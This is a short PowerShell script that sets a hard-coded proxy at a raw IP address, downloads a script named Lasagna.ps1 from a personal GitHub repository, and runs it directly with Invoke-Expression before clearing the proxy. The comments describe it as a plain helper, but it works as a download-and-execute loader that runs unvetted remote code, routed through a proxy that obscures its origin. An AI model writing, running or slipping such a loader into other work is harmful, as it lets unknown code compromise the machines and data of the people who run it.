# Set the proxy server information (replace with your proxy server details)
$proxyServer = "50.168.163.183:80"

# Set the URL of the raw GitHub script
$githubScriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"

# Set the proxy settings for the current session
[system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($proxyServer)
[system.net.webrequest]::defaultwebproxy.UseDefaultCredentials = $true

# Download the GitHub script
$scriptContent = Invoke-RestMethod -Uri $githubScriptURL

# Run the downloaded script
Invoke-Expression -Command $scriptContent

# Remove the proxy settings to avoid affecting other PowerShell sessions
[system.net.webrequest]::defaultwebproxy = $null
